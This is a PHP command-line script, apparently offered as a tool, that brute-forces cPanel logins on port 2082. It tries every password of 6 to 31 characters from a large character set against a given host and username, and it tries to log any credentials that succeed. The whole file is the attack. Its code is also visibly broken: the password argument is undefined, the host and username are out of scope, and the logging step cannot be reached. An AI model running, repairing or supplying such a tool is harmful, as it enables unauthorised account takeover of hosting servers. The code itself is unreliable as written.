<?php
error_reporting(0);
echo "\n  ______            ";                  
echo "\n |  ____|           		";
echo "\n | |__  __  ___   _ 		";
echo "\n |  __| \ \/ / | | |		";
echo "\n | |____ >  <| |_| |	  ";
echo "\n |______/_/\_\\__, |    ";
echo "\n               __/ |    ";
echo "\n              |___/     ";
 
function logs($reason,$ext = "txt"){
    if(!is_dir("files")):mkdir("files","0493");
    endif;
    $fp = fopen("files/".date("m-d-y").".".$ext, "a+");
    fwrite($fp, "**|cpanel|".date("g:i:sA")."|".$reason."|\n");
}
 
function cpanel_check($host,$user,$pass,$timeout){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://".$host.":2082");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
    curl_setopt($ch, CURLOPT_USERPWD, $user.":".$pass);
    curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_FAILONERROR, 1);
    $data = curl_exec($ch);
    if ( curl_errno($ch) == 28 ) { 
        return "Request Time Out";
        exit;
        }
    elseif ( curl_errno($ch) == 0 ){
    return $user.":".$pass;
        logs($user.":".$pass,"txt");
        exit() ; 
    }
    curl_close($ch);
}
 
if(isset($_SERVER['argv'][1])){ 
    $host = $_SERVER['argv'][1];
    $username = $_SERVER['argv'][2];
 
	echo "\nBrute Force";
	echo "\n".$_SERVER['argv'][1]; 
 
    $charset  = "1234567890";
    $charset .= "abcdefghijklmnopqrstuvwxyz";
    $charset .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $charset .= " ~!@#$%^&*()_+|`\={}[]:;'<>,./?";
 
    $charset_length = strlen($charset);
    function check($string,$host,$username){ 
 
        echo "\n".$host. " => ". $string ;
        cpanel_check($host,$username,$password,"3600");
    }
 
    function recurse ($width,$position,$base_str,$str){
        global $charset, $charset_length ;
        for ($i = 0 ; $i < $charset_length ; $i++) {
            if ($position < $width - 1){
               recurse($width,$position+1,$base_str.$charset[$i],$str);
            };
            check($base_str.$charset[$i],$host,$username);
        } 
    }
 
	for ($i = 6 ; $i < 32 ; $i++) {
		recurse($i,0,"",$str);
	}
 
} else {
	echo "\n sad dude";
	echo "\n";
}
 
?>
